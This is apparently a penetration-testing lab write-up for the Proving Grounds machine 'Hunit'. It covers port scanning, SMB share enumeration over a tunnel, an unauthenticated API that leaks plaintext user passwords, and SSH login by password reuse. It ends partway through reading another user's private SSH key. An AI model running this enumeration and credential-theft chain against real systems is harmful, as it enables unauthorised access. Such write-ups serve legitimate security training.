# Hunit

# Enumeration

## nmap

```bash
# Nmap 7.91 scan initiated Sun Feb 27 10:56:08 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hunit/results/192.168.71.125/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hunit/results/192.168.71.125/scans/xml/_full_tcp_nmap.xml" 192.168.71.125
adjust_timeouts2: packet supposedly had rtt of -96723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -96723 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -96083 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -96083 microseconds.  Ignoring time.
Nmap scan report for 192.168.71.125
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-27 10:56:10 EST for 572s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT      STATE SERVICE     REASON         VERSION
8080/tcp  open  http-proxy  syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Sun, 27 Feb 2022 16:04:10 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 27 Feb 2022 16:04:10 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Sun, 27 Feb 2022 16:04:10 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: My Haikus
12445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18030/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.46 ((Unix))
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdtyB+UZiCMunw9Cjpg1M5yda6gJvY9DgsuFuuTfMwpe1gRp6xnQparU4u+5h+KPkCvG1h2WCj9skJ4guDNY7KgidPsfxrbKBxE0815hkntRU+xZVZneSvX20yxSU8JGZgFJPSfTaTRiRvXgDY1ljJ4c+wq9QiAg0mpXyJzHLsJGZ9z9V+5Mm4+EC8yF3xla+TAFVZtykbTFSWjf/1nZS0famFh/TMSJ333s630q6VqLKBwJ0mc75Ui6Hk+9VlGNI29NejkQufCeYSebgGZHqIT+fcjjHIZWLJIBL/KIArcgHBTUbeXKBrEoNFsA+fFGewHYNxt7Ux+w7kYF0bEAel/TcwUN4b0ZbDY1iC/dPyfWk/gXtsnaQe8oYC+JkUZwz8wSgNhWecmJjS9P/C983M7IoyRaWR9yRqEN+h/yR10heEoAD/UOW6LnpoJNQQenev2B+z9XlW0rXUB8yLUZNiJm59bjJhYMTvEZLLaeoCd1IXbtfPfjWp7EO+3zfs2xc=
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL68h2Z2xFUEzj7sURecPLgl8HJIdhZlhl0fOycHpBBiStKmKVTpDVLoOMPCspSWGHO2APE0Pd+dloHVc6lfVCc=
|   256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJWx+j72EVaL4qf6GJyePnJCG+SbfHaHB3st9je9n8oR
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=9%D=2/27%Time=621BA0F9%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r\nDat
SF:e:\x20Sun,\x2027\x20Feb\x202022\x2016:04:10\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x20UP\
SF:n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\x20co
SF:mmercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(html5up\
SF:.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</title>\
SF:n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1,\x20user-scalable=no
SF:\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css\"\x2
SF:0/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t\t<!-
SF:-\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">\n\t\
SF:t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"row\">
SF:\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<header\x2
SF:0id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"logo\">
SF:My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t</div
SF:>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\n\n\t
SF:\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTTPOpti
SF:ons,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-L
SF:ength:\x200\r\nDate:\x20Sun,\x2027\x20Feb\x202022\x2016:04:10\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x20505\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x20465\r\nDate:\x20Sun,\x2027\x20Feb\x202022\x2016:
SF:04:10\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Sup
SF:ported</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,A
SF:rial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-
SF:color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x
SF:20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:blac
SF:k;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</st
SF:yle></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20V
SF:ersion\x20Not\x20Supported</h1></body></html>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.4 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/27%OT=8080%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=621BA156%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10C%TI=Z%TS=A)
SEQ(SP=103%GCD=1%ISR=10C%TI=Z%II=I%TS=C)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 5.220 days (since Tue Feb 22 05:48:35 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   177.23 ms 192.168.49.1
2   177.30 ms 192.168.71.125

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 27 11:05:42 2022 -- 1 IP address (1 host up) scanned in 575.59 seconds
```

## 8080 - Web
![](Pasted%20image%2020220227235720.png)

## 12445 - Samba

```bash
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start ssh                                                                                                                                      255 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo ssh kali@localhost -L 445:192.168.71.125:12445
kali@localhost's password: 
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 18 08:54:38 2022
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run “touch ~/.hushlogin” to hide this message)
┌──(kali㉿kali)-[~]
└─$
```

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -H 127.0.0.1 -P 445                                     
[+] IP: 127.0.0.1:445   Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Commander                                               READ, WRITE     Dademola Files
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.2)
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ smbmap -H 127.0.0.1 -P 445 -R
[+] IP: 127.0.0.1:445   Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Commander                                               READ, WRITE     Dademola Files
        .\Commander\*
        dr--r--r--                0 Sun Feb 27 11:09:50 2022    .
        dr--r--r--                0 Fri Jan 15 12:58:49 2021    ..
        fr--r--r--              479 Fri Nov  6 13:11:16 2020    25_tailrec_function.kt
        fr--r--r--              822 Fri Nov  6 13:11:16 2020    30_abstract_class.kt
        fr--r--r--              861 Fri Nov  6 13:11:16 2020    48_lazy_keyword.kt
        fr--r--r--              528 Fri Nov  6 13:11:16 2020    24_infix_function.kt
        fr--r--r--              545 Fri Nov  6 13:11:16 2020    52_let_scope_function.kt
        fr--r--r--              470 Fri Nov  6 13:11:16 2020    26_class_and_constructor.kt
        fr--r--r--              493 Fri Nov  6 13:11:16 2020    4_variables_data_types.kt
        fr--r--r--              469 Fri Nov  6 13:11:16 2020    40_arrays.kt
        fr--r--r--              927 Fri Nov  6 13:11:16 2020    44_filter_map_sorting.kt
        fr--r--r--              163 Fri Nov  6 13:11:16 2020    6_kotlin_basics.kt
        fr--r--r--             1190 Fri Nov  6 13:11:16 2020    35_lambdas_higher_order_functions.kt
        fr--r--r--              263 Fri Nov  6 13:11:16 2020    5_kotlin_basics.kt
        fr--r--r--              498 Fri Nov  6 13:11:16 2020    43_set_hashset.kt
        fr--r--r--              372 Fri Nov  6 13:11:16 2020    10_if_expression.kt
        fr--r--r--              301 Fri Nov  6 13:11:16 2020    13_while_loop.kt
        fr--r--r--              251 Fri Nov  6 13:11:16 2020    21_named_parameters.kt
        fr--r--r--              601 Fri Nov  6 13:11:16 2020    42_map_hashmap.kt
        fr--r--r--              568 Fri Nov  6 13:11:16 2020    47_lateinit_keyword.kt
        fr--r--r--              704 Fri Nov  6 13:11:16 2020    41_list.kt
        fr--r--r--              171 Fri Nov  6 13:11:16 2020    17_functions_basics.kt
        fr--r--r--              556 Fri Nov  6 13:11:16 2020    36_lambdas_example_two.kt
        fr--r--r--              228 Fri Nov  6 13:11:16 2020    myKotlinInteroperability.kt
        fr--r--r--              217 Fri Nov  6 13:11:16 2020    3_comments.kt
        fr--r--r--               80 Fri Nov  6 13:11:16 2020    1_hello_world.kt
        fr--r--r--              413 Fri Nov  6 13:11:16 2020    22_extension_function_one.kt
        fr--r--r--              882 Fri Nov  6 13:11:16 2020    51_also_scope_function.kt
        fr--r--r--              663 Fri Nov  6 13:11:16 2020    50_apply_scope_function.kt
        fr--r--r--              421 Fri Nov  6 13:11:16 2020    18_functions_as_expressions.kt
        fr--r--r--              646 Fri Nov  6 13:11:16 2020    45_predicate.kt
        fr--r--r--              358 Fri Nov  6 13:11:16 2020    37_lambdas_closures.kt
        fr--r--r--              257 Fri Nov  6 13:11:16 2020    12_for_loop.kt
        fr--r--r--              510 Fri Nov  6 13:11:16 2020    23_extension_function_two.kt
        fr--r--r--              226 Fri Nov  6 13:11:16 2020    10_default_functions.kt
        fr--r--r--              762 Fri Nov  6 13:11:16 2020    27_inheritance.kt
        fr--r--r--              576 Fri Nov  6 13:11:16 2020    49_with_scope_function.kt
        fr--r--r--              116 Fri Nov  6 13:11:16 2020    6_Person.kt
        fr--r--r--             1075 Fri Nov  6 13:11:16 2020    46_null_safety.kt
        fr--r--r--              447 Fri Nov  6 13:11:16 2020    39_with_apply_functions.kt
        fr--r--r--              358 Fri Nov  6 13:11:16 2020    8_string_interpolation.kt
        fr--r--r--             1048 Fri Nov  6 13:11:16 2020    31_interface.kt
        fr--r--r--              301 Fri Nov  6 13:11:16 2020    7_data_types.kt
        fr--r--r--              524 Fri Nov  6 13:11:16 2020    28_overriding_methods_properties.kt
        fr--r--r--              183 Fri Nov  6 13:11:16 2020    2_explore_first_app.kt
        fr--r--r--              795 Fri Nov  6 13:11:16 2020    33_object_declaration.kt
        fr--r--r--              649 Fri Nov  6 13:11:16 2020    53_run_scope_function.kt
        fr--r--r--              365 Fri Nov  6 13:11:16 2020    15_break_keyword.kt
        fr--r--r--              311 Fri Nov  6 13:11:16 2020    14_do_while.kt
        fr--r--r--              351 Fri Nov  6 13:11:16 2020    32_data_class.kt
        fr--r--r--              275 Fri Nov  6 13:11:16 2020    11_when_expression.kt
        fr--r--r--              427 Fri Nov  6 13:11:16 2020    38_it_keyword_lambdas.kt
        fr--r--r--              297 Fri Nov  6 13:11:16 2020    MyJavaFile.java
        fr--r--r--              414 Fri Nov  6 13:11:16 2020    34_companion_object.kt
        fr--r--r--              362 Fri Nov  6 13:11:16 2020    16_continue_keyword.kt
        fr--r--r--              595 Fri Nov  6 13:11:16 2020    9_ranges.kt
        fr--r--r--              595 Fri Nov  6 13:11:16 2020    29_inheritance_primary_secondary_constructor.kt
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.2)
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

### Downloading files

```bash
┌──(kali㉿kali)-[/tmp/files]
└─$ smbclient //127.0.0.1/Commander -N
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> prompt
smb: \> recurse
smb: \> mget *
getting file \25_tailrec_function.kt of size 479 as 25_tailrec_function.kt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \30_abstract_class.kt of size 822 as 30_abstract_class.kt (1.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \48_lazy_keyword.kt of size 861 as 48_lazy_keyword.kt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \24_infix_function.kt of size 528 as 24_infix_function.kt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
...
```

## 18030 - Web

![](Pasted%20image%2020220227235817.png)

# Exploitation

## API testing

```html
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.88.125:8080/article/in-a-station-of-the-metro
<!DOCTYPE HTML>
<!--
        Minimaxing by HTML5 UP
        html5up.net | @ajlkn
        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
        <head>
                <title>In a Station of the Metro</title>
                <meta charset="utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
                <link rel="stylesheet" href="/css/main.css" />
        </head>
        <body>
                <div id="page-wrapper">

                        <!-- Header -->

                                <div id="header-wrapper">
                                        <div class="container">
                                                <div class="row">
                                                        <div class="col-12">

                                                                <header id="header">
                                                                        <h1><a href="/" id="logo">My Haikus</a></h1>
                                                                </header>

                                                        </div>
                                                </div>
                                        </div>
                                </div>



                                <div id="main">
                                        <div class="container">


<section class="article">
        <header class="article-header">
                <h1 class="article-title">In a Station of the Metro</h1>
                <p class="article-meta">By  <strong>James</strong>, on <strong>2022-02-15 15th 2022</strong></p>
        </header>

        <div class="article-description">
                <div>Ezra Pound</div>
                <br>
                <br>
                <br>

                <p>The apparition of these faces in the crowd; Petals on a wet, black bough.</p>
        </div>
</section>

<!--
<a href="http://localhost:8080/api/">List all</a>
-->

</div>
                                </div>

                        <!-- Footer -->
                                <div id="footer-wrapper">
                                        <div class="container">
                                                <div class="row">
                                                        <div class="col-12">

                                                                <div id="copyright">
                                                                        &copy; Untitled. All rights reserved. | Design: <a href="http://html5up.net">HTML5 UP</a>
                                                                </div>

                                                        </div>
                                                </div>
                                        </div>
                                </div>

                </div>

                <!-- Scripts -->
                        <script src="/js/jquery.min.js"></script>
                        <script src="/js/browser.min.js"></script>
                        <script src="/js/breakpoints.min.js"></script>
                        <script src="/js/util.js"></script>
                        <script src="/js/main.js"></script>

        </body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```json
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.88.125:8080/api/article/'
[{"title":"The Taste of Rain","headline":"Jack Kerouac","content":"The taste, Of rain, —Why kneel?","author":{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10},"slug":"the-taste-of-rain","addedAt":"2022-02-15T12:52:21.709783","id":12},{"title":"In a Station of the Metro","headline":"Ezra Pound","content":"The apparition of these faces in the crowd; Petals on a wet, black bough.","author":{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10},"slug":"in-a-station-of-the-metro","addedAt":"2022-02-15T12:52:21.708261","id":11},{"title":"Over the Wintry","headline":"Natsume Soseki","content":"Over the wintry Forest, winds howl in rage, With no leaves to blow.","author":{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},"slug":"over-the-wintry","addedAt":"2022-02-15T12:52:21.705847","id":9},{"title":"A Poppy Blooms","headline":"Katsushika Hokusai","content":"I write, erase, rewrite. Erase again, and then, A poppy blooms.","author":{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},"slug":"a-poppy-blooms","addedAt":"2022-02-15T12:52:21.70438","id":8},{"title":"Lighting One Candle","headline":"Yosa Buson","content":"The light of a candle, Is transferred to another candle—, Spring twilight","author":{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},"slug":"lighting-one-candle","addedAt":"2022-02-15T12:52:21.700557","id":5},{"title":"A World of Dew","headline":"Kobayashi Issa","content":"A world of dew, And within every dewdrop, A world of struggle. ","author":{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},"slug":"a-world-of-dew","addedAt":"2022-02-15T12:52:21.698928","id":4},{"title":"The Old Pond","headline":"Matsuo Basho","content":"An old silent pond, A frog jumps into the pond—, Splash! Silence again.","author":{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},"slug":"the-old-pond","addedAt":"2022-02-15T12:52:21.673983","id":2}]                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.88.125:8080/api/user/'   
[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}]                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.88.125:8080/api/'        
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Password reuse

`"login":"dademola","password":"ExplainSlowQuest110"`

```bash
┌──(kali㉿kali)-[~]
└─$ ssh dademola@192.168.88.125 -p 43022                                                                                                                          130 ⨯
The authenticity of host '[192.168.88.125]:43022 ([192.168.88.125]:43022)' can't be established.
ECDSA key fingerprint is SHA256:gACaWshEOZmOlWwbZFitcqf2i6nc8Sy1KRDB7F0Zxok.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.88.125]:43022' (ECDSA) to the list of known hosts.
dademola@192.168.88.125's password: 
[dademola@hunit ~]$ ls
blog.jar  local.txt  shared
[dademola@hunit ~]$ cat local.txt
79908bb6084c4b997678fbe0a2d75e82
[dademola@hunit ~]$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.88.125  netmask 255.255.255.0  broadcast 192.168.88.255
        inet6 fe80::250:56ff:feba:f80d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:f8:0d  txqueuelen 1000  (Ethernet)
        RX packets 432  bytes 38808 (37.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 318  bytes 232717 (227.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[dademola@hunit ~]$
```

![](Pasted%20image%2020220228224002.png)
# Privesc
## Accessing the git user

```bash
[dademola@hunit ~]$ cd ..
[dademola@hunit home]$ ls
dademola  git
[dademola@hunit home]$ cd git
[dademola@hunit git]$ ls
git-shell-commands
[dademola@hunit git]$ ls -al                
total 28
drwxr-xr-x 4 git  git  4096 Nov  5  2020 .
drwxr-xr-x 4 root root 4096 Nov  5  2020 ..
-rw------- 1 git  git     0 Jan 15  2021 .bash_history
-rw-r--r-- 1 git  git    21 Aug  9  2020 .bash_logout
-rw-r--r-- 1 git  git    57 Aug  9  2020 .bash_profile
-rw-r--r-- 1 git  git   141 Aug  9  2020 .bashrc
drwxr-xr-x 2 git  git  4096 Nov  5  2020 .ssh
drwxr-xr-x 2 git  git  4096 Nov  5  2020 git-shell-commands
[dademola@hunit git]$ cd .ssh
[dademola@hunit .ssh]$ ls
authorized_keys  id_rsa  id_rsa.pub
[dademola@hunit .ssh]$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtvi+/zIFPzCfn2CBFxGtflgPf6jLxY9ZFEwZNHbQjg32p3cWbzQG
wRWNSVlBYzj6sXPjcWTRc7p08WHb9/85L0/f94lfXUIB9ptipL9EHxSUDxGroP60H9jJTj
0Kuety1G+xSyti++Qji6hxmuRrQ4e5Q6lBn84/CXAnRH6GLYFRywJEXQtLHCwtlhVEqP7H
ZAWLtDFnWQV7eMF9RCNBVSWBbeQITbZDSbctg5P0H35ioPu67Pygo9SfSRXpBPVBI13feB
II2V3iL+BQy6seCj7tHj9pNYZFWjroKVCBZkoLfLsTHRkXDKLRICvcHw1yOWUf4sFNnXkc
lHCxsEU6dJD9k7hwnK1Es+QglXQSS0JOmPwTfpRkrX1d27K31roQP/YGVbZJEi3stAmaZ3
iQ1cQMy2NQ6ESoupNdQeVFy0E4cpp/NDyazh/vt2irc6fUN+jdFvCWZbIO6pml+HWOU3U3
AxFTSXmbrjMHahArxMq/JtUwJauyw09FKtycEO3zAAAFgJYa8VCWGvFQAAAAB3NzaC1yc2
EAAAGBALb4vv8yBT8wn59ggRcRrX5YD3+oy8WPWRRMGTR20I4N9qd3Fm80BsEVjUlZQWM4
+rFz43Fk0XO6dPFh2/f/OS9P3/eJX11CAfabYqS/RB8UlA8Rq6D+tB/YyU49CrnrctRvsU
srYvvkI4uocZrka0OHuUOpQZ/OPwlwJ0R+hi2BUcsCRF0LSxwsLZYVRKj+x2QFi7QxZ1kF
e3jBfUQjQVUlgW3kCE22Q0m3LYOT9B9+YqD7uuz8oKPUn0kV6QT1QSNd33gSCNld4i/gUM
urHgo+7R4/aTWGRVo66ClQgWZKC3y7Ex0ZFwyi0SAr3B8NcjllH+LBTZ15HJRwsbBFOnSQ
/ZO4cJytRLPkIJV0EktCTpj8E36UZK19Xduyt9a6ED/2BlW2SRIt7LQJmmd4kNXEDMtjUO
hEqLqTXUHlRctBOHKafzQ8ms4f77doq3On1Dfo3RbwlmWyDuqZpfh1jlN1NwMRU0l5m64z
B2oQK8TKvybVMCWrssNPRSrcnBDt8wAAAAMBAAEAAAGAL2RonFMJdt+SSMbHSQFkLbiDcy
52cVp62T4IvUUVKeZGAARhhDY2laaObPQ4concrT/2JnXVpqMiDS+quSabWjzXJxem4tHp
DkYbG88Kxv4eh3StPssaPrF5GtHGyHdKy+mOQ4keX14tMsxTeKo3ektaWkMp40mZnEk3co
9PE9ROKkYRDQSS1N5AhIJHwXoUjTy+fdLaEP3RiGqdlpuHHZXUW3FYEUDnVt2iZVVaQxoK
U+Y/+YhJ14WIKHcLXyRi5YG5YGwsVQl3M0Ji+spIs5p6Xr2+Jwak9Zd6laBJt4Dt2/tt9C
eF0ohAr89b4Kkg2tLQ8yphogyP/yZJiOElOcjf3e2CRWrjEVwXmt98EXHUlkf0cj7gcZBa
Ao5Pp/gxGX3wgVSguE1oTTcDa1Cnxu2fpLF1BscVQ3IuugnzMBljKkS0sGHGny1ujSNGE9
L3/jbS0DQBQHwz37S6M2C3W2A4tqmbUcX4xdUHG8kXn1LvybJpbGsTT7eZ3l/NDgBRAAAA
wQCMOvhEi8kvk4uNYJhHSCDdDZ4Hpso0/wQXbJu1SX2ZKkSc0DGJ4MiK5QftbG5g/OQs7g
